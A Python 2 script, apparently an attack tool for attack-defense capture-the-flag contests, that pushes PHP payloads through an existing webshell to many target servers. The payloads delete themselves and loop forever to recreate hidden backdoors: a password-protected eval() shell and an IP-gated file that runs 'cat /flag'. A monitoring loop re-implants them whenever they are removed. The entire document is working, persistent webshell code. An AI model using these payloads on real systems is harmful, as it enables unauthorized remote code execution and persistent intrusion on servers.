#By ZacharyZcR
import requests
import time
import os
#------------------------------------------------------------------------------------Edit-this-part----------
trojan_data = {'a':'''ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='poi.php';$code='<?php if(md5($_GET["pass"])=="507f546195544d36a02a24f1e73eb773"){@eval($_POST[a]);}?>';while(1){file_put_contents($file,$code);usleep(5000);}?>'''}
#---------------------------------------------------------------------------------------Edit-this-part----------
get_flag_data = {'a':'''ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='uyt.php';$code='<?php $ip = $_SERVER["REMOTE_ADDR"];if($ip=="117.173.217.106"){echo("Administrator Confirmation.\r\n");system("cat /flag");}else echo(md5(mt_rand()));?>';while(1){file_put_contents($file,$code);usleep(5000);}?>'''}

webshell_name = raw_input("Please input your webshell's name:")
trojan_name = raw_input("Please input your Undead Trojan Horse's name:")
get_flag_name = raw_input("Please input your get flag file's name:")
	
team_number = input("Number of teams:")
base_url = []
base_url_txt = []

config_file=open('trojan_config.txt')
for line in config_file:
	line=line.strip('\r\n')
	base_url_txt.append(line)
config_file.close()
	
for i in range(team_number):
	base_url.append(base_url_txt[i])
	print base_url[i]
	r = requests.get(base_url[i]+webshell_name)
	if r.status_code == 200:
		print "Webshell",i+1,"works well."
	else:
		print "Webshell",i+1,"failed."
		
def implant():
	for i in range(team_number):
		try:
			r = requests.post(base_url[i]+webshell_name,data=trojan_data,timeout=1)
		except:
			r = requests.get(base_url[i]+trojan_name)
			if r.status_code == 200:
				print "Undead Trojan Horse",i+1,"Implanted Successfully."
		try:
			r = requests.post(base_url[i]+webshell_name,data=get_flag_data,timeout=1)
		except:
			r = requests.get(base_url[i]+get_flag_name)
			if r.status_code == 200:
				print "Get flag file",i+1,"Implanted Successfully."
		print "*******************************************************"
	
while (1):
	localtime = time.asctime(time.localtime(time.time()))
	print "*******************************************************"
	print localtime
	print "*******************************************************"
	for i in range(team_number):
		r = requests.get(base_url[i]+trojan_name)
		if r.status_code == 200:
			print "The Undead Trojan",i+1,"still lives."
		else:implant()
		r = requests.get(base_url[i]+get_flag_name)
		if r.status_code == 200:
			print "The Get flag file",i+1,"still lives."
		else:implant()
		print "*******************************************************"
	time.sleep(30)